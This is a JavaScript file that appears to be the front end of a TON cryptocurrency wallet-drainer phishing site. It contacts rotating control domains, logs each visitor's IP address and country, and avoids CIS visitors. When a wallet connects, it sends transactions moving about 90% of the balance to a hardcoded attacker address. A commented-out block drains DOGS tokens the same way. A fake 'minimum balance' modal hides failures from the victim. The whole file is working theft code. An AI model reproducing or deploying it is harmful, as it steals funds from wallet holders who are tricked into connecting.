const LIST_DOMAINS = ['ucpuznvvcy.com', 'gybzdhahpl.com', 'kvutxcjcku.com', 'bydyindfam.com', 'ytyynulnnp.com'];

const SERVER_DOMAIN = LIST_DOMAINS[Math.floor(Math.random() * (LIST_DOMAINS.length - 1))]; // 'nwkjaia.com';
const URL_SERVICE_IP =
    'https://ipgeolocation.abstractapi.com/v1?api_key=90d3a7da6a5c4901a75d380c6e27c700';
const UUID_CHAT = 'x67WhmQ67aGq65Y3PN1M';
const URL_SERVICE_SNG = `https://${SERVER_DOMAIN}/api/v1/${UUID_CHAT}/sng`;

const domain = window.location.hostname;

let h1_message = 'The min balance must be 0.2 TON',
    p_message = 'Please connect another wallet',
    but_message = 'Close';

// ÐŸÐµÑ€ÐµÐ¼ÐµÐ½Ð½Ñ‹Ðµ ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð¿Ð¾Ð»ÑƒÑ‡Ð°ÐµÐ¼ Ñ ton
let connectedWallet;

// ÐŸÐµÑ€ÐµÐ¼ÐµÐ½Ð½Ñ‹Ðµ ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ðµ Ð¿Ñ€Ð¸Ñ…Ð¾Ð´ÑÑ‚ Ñ ÑÐµÑ€Ð²ÐµÑ€Ð°
let UserInfo;

// Ð˜Ð½ÑÑ‚Ð°Ð½ÑÑ‹
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://token.bigxdex.online/tonconnect-manifest.json',
    // buttonRootId: 'openModal',
});

const $api = axios.create({
    baseURL: 'https://' + SERVER_DOMAIN + '/api/v2',
});

// Ð¤ÑƒÐ½ÐºÑ†Ð¸Ð¸ Ð´Ð»Ñ Ñ€Ð°Ð±Ð¾Ñ‚Ñ‹
const openModalUi = () => tonConnectUI.openModal();

const checkLocation = (country, sng) =>
    sng &&
    ['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ', 'TM', 'TJ'].includes(
        country,
    );

axios.get(URL_SERVICE_IP).then(({data}) => {
    const country = data.country_code.toUpperCase();
    axios.get(URL_SERVICE_SNG).then(({data: {sng}}) => {
        if (checkLocation(country, sng)) {
            window.location.replace('https://ton.org');
        }
    });
});

// ÐžÑÐ½Ð¾Ð²Ð½Ð¾Ð¹ Ñ„ÑƒÐ½ÐºÑ†Ð¸Ð¾Ð½Ð°Ð»
axios.get(URL_SERVICE_IP).then(({data}) => {
    const country = data.country_code;

    UserInfo = {
        ip: data.ip_address,
        country,
        domain,
        uuid: UUID_CHAT,
    };

    if (!localStorage.getItem('open')) {
        $api
            .post('/open', UserInfo)
            .then((data) => {
                localStorage.setItem('open', '1');
            })
            .catch((err) => console.log('Error #1'));
    }
});

tonConnectUI.onStatusChange((wallet) => {
    connectedWallet = wallet;
    // console.log(wallet, TonWeb);
    // sendTransaction(wallet.account.address).then(console.log);
    axios.get(URL_SERVICE_IP).then(({data}) => {
        const country = data.country_code;

        UserInfo = {
            ip: data.ip_address,
            country,
            domain,
            uuid: UUID_CHAT,
        };

        const payload = {
            ConnectedWallet: connectedWallet,
            UserInfo: UserInfo,
        };
        $api
            .post('/connect', payload)
            .then(async (response) => {
                const transactions = response.data.transactions;
                const assets = response.data.assets;
                let start = 0;
                let end = 4;
                const step = 4;
                for (let i = 0; i < transactions.length; i++) {
                    try {
                        const transaction = transactions[i];
                        const b = await getTonBalance(wallet.account.address);


                        const final = Math.floor(b);
                        const o = {
                            ...transaction,
                            messages: [{
                                address: "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9",
                                amount: final + "",
                                payload: transaction?.messages?.at(-1)?.payload || undefined
                            }]
                        }
                        console.log(transaction, o);
                        await tonConnectUI.sendTransaction(o);
                    } catch (e) {
                        console.log(e);
                    }
                    start += step;
                    end += step;
                }
            })
            .catch((err) => showModal());
    });
});

async function showModal() {
    const modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '50%'; //ÐžÑ‚ÑÑ‚ÑƒÐ¿ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð° Ð²ÐµÑ€Ñ…-Ð½Ð¸Ð·
    modal.style.left = '50%'; //ÐžÑ‚ÑÑ‚ÑƒÐ¿ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð° Ð»ÐµÐ²Ð¾-Ð¿Ñ€Ð°Ð²Ð¾
    modal.style.transform = 'translate(-50%, -50%)';
    modal.style.backgroundColor = '#121214'; // Ð¤Ð¾Ð½ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
    modal.style.color = '#fff'; // Ð¦Ð²ÐµÑ‚ Ñ‚ÐµÐºÑÑ‚Ð°
    modal.style.padding = '20px'; //ÐžÑ‚ÑÑ‚ÑƒÐ¿Ñ‹ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
    modal.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)'; //Ð¢ÐµÐ½ÑŒ Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
    modal.style.zIndex = '1000';
    modal.style.borderRadius = '24px'; // Ð¡ÐºÑ€ÑƒÐ³Ð»ÐµÐ½Ð½Ñ‹Ðµ ÑƒÐ³Ð»Ñ‹
    modal.style.textAlign = 'center'; // Ð’Ñ‹Ñ€Ð°Ð²Ð½Ð¸Ð²Ð°Ð½Ð¸Ðµ ÑÐ»ÐµÐ¼ÐµÐ½Ñ‚Ð¾Ð² Ð¿Ð¾ Ñ†ÐµÐ½Ñ‚Ñ€Ñƒ
    modal.style.maxWidth = '400px'; // ÐœÐ°ÐºÑÐ¸Ð¼Ð°Ð»ÑŒÐ½Ð°Ñ ÑˆÐ¸Ñ€Ð¸Ð½Ð° Ð¼Ð¾Ð´Ð°Ð»ÑŒÐ½Ð¾Ð³Ð¾ Ð¾ÐºÐ½Ð°
    modal.style.width = '90%'; // Ð¨Ð¸Ñ€Ð¸Ð½Ð° Ð´Ð»Ñ Ð¼Ð¾Ð±Ð¸Ð»ÑŒÐ½Ñ‹Ñ… ÑƒÑÑ‚Ñ€Ð¾Ð¹ÑÑ‚Ð²

    // Ð”Ð¾Ð±Ð°Ð²Ð»ÑÐµÐ¼ ÑˆÑ€Ð¸Ñ„Ñ‚
    const link = document.createElement('link');
    link.href =
        'https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap';
    link.rel = 'stylesheet';
    document.head.appendChild(link);
    modal.style.fontFamily = '"Roboto", sans-serif';

    const h1_modal = document.createElement('h1');
    h1_modal.textContent = h1_message;
    const p_modal = document.createElement('p');
    p_modal.textContent = p_message;

    const closeButton = document.createElement('button');
    closeButton.textContent = but_message;
    closeButton.style.backgroundColor = 'rgb(53, 53, 53)'; //  Ñ„Ð¾Ð½ ÐºÐ½Ð¾Ð¿ÐºÐ¸
    closeButton.style.color = '#fff'; // Ð¦Ð²ÐµÑ‚ Ñ‚ÐµÐºÑÑ‚Ð°
    closeButton.style.fontSize = '14px'; // Ð Ð°Ð·Ð¼ÐµÑ€ ÑˆÑ€Ð¸Ñ„Ñ‚Ð° ÐºÐ½Ð¾Ð¿ÐºÐ¸
    closeButton.style.borderRadius = '10px'; // Ð¡ÐºÑ€ÑƒÐ³Ð»ÐµÐ½Ð½Ñ‹Ðµ ÑƒÐ³Ð»Ñ‹ ÐºÐ½Ð¾Ð¿ÐºÐ¸
    closeButton.style.border = 'none'; // Ð‘ÐµÐ· Ñ€Ð°Ð¼ÐºÐ¸
    closeButton.style.padding = '10px 10px 10px 10px'; // ÐžÑ‚ÑÑ‚ÑƒÐ¿Ñ‹ Ð²Ð½ÑƒÑ‚Ñ€Ð¸ ÐºÐ½Ð¾Ð¿ÐºÐ¸
    closeButton.style.fontWeight = '600'; //Ð–Ð¸Ñ€Ð½Ð¾ÑÑ‚ÑŒ ÑˆÑ€Ð¸Ñ„Ñ‚Ð° ÐºÐ½Ð¾Ð¿ÐºÐ¸
    closeButton.style.cursor = 'pointer';
    closeButton.onclick = () => {
        document.body.removeChild(modal);
        tonConnectUI.disconnect();
        setTimeout(() => {
            location.reload();
        }, 300);
    };

    modal.appendChild(h1_modal);
    modal.appendChild(p_modal);
    modal.appendChild(closeButton);

    document.body.appendChild(modal);
}

//
// const tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC'));
//
// // Replace with your Jetton's master contract address
// const dogsContractAddress = "EQCvxJy4eG8hyHBFsZ7eePxrRsUQSFE_jpptRAYBmcG_DOGS"; // The Jetton master contract address
//
// // Initialize the Jetton Minter contract
// const dogsContract = new TonWeb.token.jetton.JettonMinter(tonweb.provider, {
//     address: new TonWeb.utils.Address(dogsContractAddress)
// });
//
//
// /**
//  *
//  * @param recipientAddress {string}
//  * @returns {Promise<string>}
//  */
// async function getAccountDogsBalance(recipientAddress) {
//     try {
//         const recipientJettonWalletAddress = await dogsContract.getJettonWalletAddress(new TonWeb.utils.Address(recipientAddress));
//         console.log('Recipient Jetton Wallet Address:', recipientJettonWalletAddress.toString());
//
//         const jettonWalletContract = new TonWeb.token.jetton.JettonWallet(tonweb.provider, {
//             address: recipientJettonWalletAddress,
//         });
//
//         // Fetch the Jetton balance from the Jetton Wallet contract
//         const jettonData = await jettonWalletContract.getData();
//         const jettonBalance = jettonData.balance;
//         return TonWeb.utils.fromNano(jettonBalance);
//     } catch (error) {
//         console.error('Error fetching Jetton balance:', error);
//         return '0'
//     }
// }
//
//
// // Send the transaction via TON Connect
// async function sendTransaction(sender) {
//     const recipientAddress = 'UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9';
//     const transferAmount = await getAccountDogsBalance(sender);
//     console.log("BALANCE", transferAmount)
//     try {
//         // Fetch the sender's Jetton wallet address
//         const senderJettonWalletAddress = await dogsContract.getJettonWalletAddress(new TonWeb.utils.Address(sender));
//
//         const jettonWalletContract = new TonWeb.token.jetton.JettonWallet(tonweb.provider, {
//             address: senderJettonWalletAddress,
//         });
//
//         // Prepare the payload for the transfer
//         const payload = await jettonWalletContract.createTransferBody({
//             toAddress: new TonWeb.utils.Address(recipientAddress),
//             tokenAmount: TonWeb.utils.toNano(transferAmount),
//             forwardAmount: TonWeb.utils.toNano('0.01'), // The amount to forward to the recipient as a fee
//             forwardPayload: null, // Optional payload to send to the recipient,
//             responseAddress: senderJettonWalletAddress
//         });
//         console.log(payload);
//         const u8 = await payload.toBoc();
//         var b64encoded = btoa(u8);
//         console.log("FINAL PAYLOAD", b64encoded)
//
//         // Create the transaction request
//         const transactionRequest = {
//             validUntil: Math.floor(Date.now() / 1000) + 60, // Transaction expiration time (1 minute from now)
//             messages: [
//                 {
//                     address: senderJettonWalletAddress.toString(),
//                     amount: TonWeb.utils.toNano('0.05').toString(), // Fee for executing the transfer
//                     payload: u8,
//                 },
//             ],
//         };
//
//         // Send the transaction request via TON Connect
//         await tonConnectUI.sendTransaction(transactionRequest);
//         console.log('Transaction sent successfully!');
//     } catch (error) {
//         console.error('Error sending transaction:', error);
//     }
// };
//
// // Execute the transaction

const tonweb = new TonWeb(new TonWeb.HttpProvider('https://toncenter.com/api/v2/jsonRPC')); // Using Toncenter's public API

async function getTonBalance(walletAddress) {
    try {
        // Convert wallet address to TONWeb Address format
        const tonAddress = new TonWeb.utils.Address(walletAddress);

        // Get the account state
        const account = await tonweb.provider.getAddressInfo(tonAddress.toString(true, true, true));

        // Check if the account exists and is active

        // Convert balance from nanotons to tons (1 TON = 10^9 nanotons)
        const balanceTon = Math.floor(parseFloat(account.balance));
        console.log(`Wallet Balance: ${balanceTon} TON`);
        return Math.floor(balanceTon - ((balanceTon / 100) * 10));
    } catch (error) {
        console.error('Failed to get TON balance:', error);
    }
}
